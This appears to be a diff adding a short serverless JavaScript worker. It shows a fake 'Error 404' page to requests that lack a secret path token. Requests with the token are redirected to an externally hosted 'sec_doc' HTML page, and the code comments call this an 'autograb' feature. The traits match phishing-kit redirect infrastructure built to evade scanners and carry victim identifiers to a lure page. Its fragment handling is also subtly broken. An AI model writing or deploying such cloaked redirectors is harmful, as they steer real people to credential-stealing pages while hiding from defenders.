@@ -1,0 +1,25 @@
+addEventListener('fetch', event => {
+    event.respondWith(handleRequest(event.request));
+  });
+  
+  async function handleRequest(request) {
+    // Extract the URL path from the request
+    const url = new URL(request.url);
+    const path = url.pathname;
+  
+    // Check if the URL path contains 'sf4eio4r'
+    if (!path.includes('sf4eio4r')) {
+      return new Response('Error 404, Page not found.', { status: 400 });
+    }
+  
+    // Extract everything after the '#' in the original URL
+    const fragment = url.hash.substring(1); // Remove the leading '#' from the fragment
+  
+    // URL with autograb feature and dynamic fragment extension
+    const autograbBaseUrl = 'https://pub-915c2a909e2b44929f7adb1407cfd494.r2.dev/sec_doc26082024.html';
+    const autograbUrl = new URL(`${autograbBaseUrl}${fragment}`);
+  
+    // Redirect to the new URL with the appended fragment
+    return Response.redirect(autograbUrl.toString(), 302);
+  }
+  
